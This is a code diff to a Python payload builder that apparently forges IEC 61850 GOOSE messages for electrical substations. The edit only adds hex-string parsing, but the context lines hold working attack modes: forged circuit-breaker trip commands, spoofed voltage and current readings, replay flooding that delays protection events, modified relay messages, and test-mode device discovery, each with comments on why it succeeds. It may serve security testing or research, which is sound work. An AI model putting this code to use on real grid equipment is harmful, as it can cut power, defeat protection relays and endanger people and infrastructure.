@@ -178,16 +178,21 @@ def build_payload(marker: str | bytes, style: str = "trip_inject", **kwargs) -> 
     gocb_ref   = f"{ied_ref}$GO${gcb_suffix}"
     dat_set    = f"{ied_ref}$PROT"
     go_id      = gocb_ref
-    conf_rev   = int(kwargs.get("conf_rev", 1))
-    appid      = int(kwargs.get("appid", 0x0004))
+    def _int(v, default=0):
+        """int() that also handles hex strings like '0x0004' from the UI."""
+        if isinstance(v, str):
+            return int(v, 0)   # base 0 → auto-detect 0x prefix
+        return int(v) if v is not None else default
+    conf_rev   = _int(kwargs.get("conf_rev"), 1)
+    appid      = _int(kwargs.get("appid"),    0x0004)
 
     # ── trip_inject ───────────────────────────────────────────────────────────
     if style == "trip_inject":
         # Attacker injects GOOSE trip command with abnormally high stNum
         # (higher than legitimate IED's running value — causes IEDs to accept it
         # as a genuine state change and execute the circuit breaker trip).
-        st_num = int(kwargs.get("st_num", rnd.randint(5000, 9999)))
-        sq_num = int(kwargs.get("sq_num", 0))
+        st_num = _int(kwargs.get("st_num", rnd.randint(5000, 9999)))
+        sq_num = _int(kwargs.get("sq_num", 0))
         # allData: [BOOLEAN trip=TRUE, BOOLEAN protection-status=TRUE]
         data_items = [_data_bool(True), _data_bool(True)]
         pdu = _goose_pdu(gocb_ref, dat_set, go_id, st_num, sq_num,
@@ -198,8 +203,8 @@ def build_payload(marker: str | bytes, style: str = "trip_inject", **kwargs) -> 
     elif style == "spoof_measurement":
         # Inject GOOSE with falsified voltage/current readings.
         # Operator and protection relays see incorrect values.
-        st_num   = int(kwargs.get("st_num", rnd.randint(100, 500)))
-        sq_num   = int(kwargs.get("sq_num", 0))
+        st_num   = _int(kwargs.get("st_num", rnd.randint(100, 500)))
+        sq_num   = _int(kwargs.get("sq_num", 0))
         voltage  = float(kwargs.get("voltage",  0.0))      # 0V = dead feeder
         current  = float(kwargs.get("current",  rnd.uniform(0.0, 5.0)))
         data_items = [
@@ -216,8 +221,8 @@ def build_payload(marker: str | bytes, style: str = "trip_inject", **kwargs) -> 
         # Rapid GOOSE replay flooding — sqNum increments continuously at the
         # same stNum. Saturates IED message queues; real protection events
         # are delayed or lost (denial of control via buffer exhaustion).
-        st_num = int(kwargs.get("st_num", rnd.randint(1, 50)))
-        sq_num = int(kwargs.get("sq_num", rnd.randint(0, 200)))
+        st_num = _int(kwargs.get("st_num", rnd.randint(1, 50)))
+        sq_num = _int(kwargs.get("sq_num", rnd.randint(0, 200)))
         data_items = [_data_bool(False), _data_float32(rnd.uniform(220.0, 240.0))]
         pdu = _goose_pdu(gocb_ref, dat_set, go_id, st_num, sq_num,
                          conf_rev, data_items, rnd, time_allowed=1000)
@@ -232,7 +237,7 @@ def build_payload(marker: str | bytes, style: str = "trip_inject", **kwargs) -> 
         relay_src   = str(kwargs.get("relay_src", "IED2LD0/LLN0"))
         relay_gocb  = f"{relay_src}$GO${gcb_suffix}"
         relay_datset = f"{relay_src}$PROT"
-        st_num = int(kwargs.get("st_num", rnd.randint(500, 1500))) + 1
+        st_num = _int(kwargs.get("st_num", rnd.randint(500, 1500))) + 1
         sq_num = 0
         # Modified data: trip = TRUE (attacker changed close→trip)
         data_items = [_data_bool(True), _data_float32(rnd.uniform(200.0, 230.0))]
@@ -247,8 +252,8 @@ def build_payload(marker: str | bytes, style: str = "trip_inject", **kwargs) -> 
         # IEDs that receive test-mode GOOSE do not act on the data; their
         # presence on the bus is observable. Used for IED discovery/mapping
         # without triggering protection actions. stNum stays low (non-threatening).
-        st_num = int(kwargs.get("st_num", rnd.randint(1, 10)))
-        sq_num = int(kwargs.get("sq_num", 0))
+        st_num = _int(kwargs.get("st_num", rnd.randint(1, 10)))
+        sq_num = _int(kwargs.get("sq_num", 0))
         data_items = [_data_bool(False)]
         pdu = _goose_pdu(gocb_ref, dat_set, go_id, st_num, sq_num,
                          conf_rev, data_items, rnd, test=True)
